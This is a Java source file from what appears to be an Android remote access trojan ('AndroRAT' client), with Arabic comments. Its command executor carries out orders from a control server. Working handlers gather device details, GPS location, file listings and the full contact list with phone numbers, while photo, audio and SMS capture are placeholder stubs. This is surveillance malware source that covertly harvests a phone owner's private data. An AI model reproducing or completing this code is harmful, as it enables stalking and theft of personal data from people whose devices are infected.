package com.example.androratclient;

import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.provider.ContactsContract;
import android.database.Cursor;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

/**
 * فئة لتنفيذ الأوامر المستلمة من سيرفر التحكم
 */
public class CommandExecutor {
    private static final String TAG = "AndroRAT_CommandExecutor";

    public static String execute(Context context, String command) {
        Log.d(TAG, "Executing command: " + command);
        
        try {
            String[] parts = command.split(":");
            String action = parts[0];
            
            switch (action) {
                case "GET_DEVICE_INFO":
                    return getDeviceInfo();
                    
                case "GET_LOCATION":
                    return getLocation(context);
                    
                case "LIST_FILES":
                    String path = parts.length > 1 ? parts[1] : Environment.getExternalStorageDirectory().getPath();
                    return listFiles(path);
                    
                case "GET_CONTACTS":
                    return getContacts(context);
                    
                case "CAPTURE_PHOTO":
                    return capturePhoto(context);
                    
                case "RECORD_AUDIO":
                    int duration = parts.length > 1 ? Integer.parseInt(parts[1]) : 10;
                    return recordAudio(context, duration);
                    
                case "GET_SMS":
                    return getSMS(context);
                    
                case "VIBRATE":
                    return vibrate(context);
                    
                default:
                    return "ERROR:Unknown command: " + command;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error executing command: " + e.getMessage());
            return "ERROR:" + e.getMessage();
        }
    }

    private static String getDeviceInfo() {
        StringBuilder info = new StringBuilder();
        info.append("Model: ").append(Build.MODEL).append("\n");
        info.append("Manufacturer: ").append(Build.MANUFACTURER).append("\n");
        info.append("Android Version: ").append(Build.VERSION.RELEASE).append("\n");
        info.append("SDK Version: ").append(Build.VERSION.SDK_INT).append("\n");
        info.append("Device: ").append(Build.DEVICE).append("\n");
        return info.toString();
    }

    private static String getLocation(Context context) {
        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            if (context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return "ERROR:Location permission not granted";
            }
            
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (location != null) {
                return "Latitude: " + location.getLatitude() + ", Longitude: " + location.getLongitude();
            } else {
                return "ERROR:Unable to get location";
            }
        } catch (Exception e) {
            return "ERROR:" + e.getMessage();
        }
    }

    private static String listFiles(String path) {
        try {
            File directory = new File(path);
            if (!directory.exists() || !directory.isDirectory()) {
                return "ERROR:Directory does not exist: " + path;
            }
            
            File[] files = directory.listFiles();
            if (files == null) {
                return "ERROR:Cannot access directory: " + path;
            }
            
            StringBuilder result = new StringBuilder();
            result.append("Files in ").append(path).append(":\n");
            
            for (File file : files) {
                result.append(file.isDirectory() ? "[DIR] " : "[FILE] ");
                result.append(file.getName());
                if (file.isFile()) {
                    result.append(" (").append(file.length()).append(" bytes)");
                }
                result.append("\n");
            }
            
            return result.toString();
        } catch (Exception e) {
            return "ERROR:" + e.getMessage();
        }
    }

    private static String getContacts(Context context) {
        try {
            if (context.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                return "ERROR:Contacts permission not granted";
            }
            
            StringBuilder contacts = new StringBuilder();
            contacts.append("Contacts:\n");
            
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.append(name).append(": ").append(phoneNumber).append("\n");
                }
                cursor.close();
            }
            
            return contacts.toString();
        } catch (Exception e) {
            return "ERROR:" + e.getMessage();
        }
    }

    private static String capturePhoto(Context context) {
        // هذه وظيفة مبسطة - في التطبيق الحقيقي ستحتاج إلى تطبيق أكثر تعقيداً
        try {
            return "SUCCESS:Photo capture initiated (placeholder implementation)";
        } catch (Exception e) {
            return "ERROR:" + e.getMessage();
        }
    }

    private static String recordAudio(Context context, int duration) {
        // هذه وظيفة مبسطة - في التطبيق الحقيقي ستحتاج إلى تطبيق أكثر تعقيداً
        try {
            return "SUCCESS:Audio recording initiated for " + duration + " seconds (placeholder implementation)";
        } catch (Exception e) {
            return "ERROR:" + e.getMessage();
        }
    }

    private static String getSMS(Context context) {
        try {
            if (context.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return "ERROR:SMS permission not granted";
            }
            
            // هذه وظيفة مبسطة - في التطبيق الحقيقي ستحتاج إلى تطبيق أكثر تعقيداً
            return "SUCCESS:SMS reading initiated (placeholder implementation)";
        } catch (Exception e) {
            return "ERROR:" + e.getMessage();
        }
    }

    private static String vibrate(Context context) {
        try {
            android.os.Vibrator vibrator = (android.os.Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) {
                vibrator.vibrate(1000); // اهتزاز لمدة ثانية واحدة
                return "SUCCESS:Device vibrated";
            } else {
                return "ERROR:Vibrator not available";
            }
        } catch (Exception e) {
            return "ERROR:" + e.getMessage();
        }
    }
}

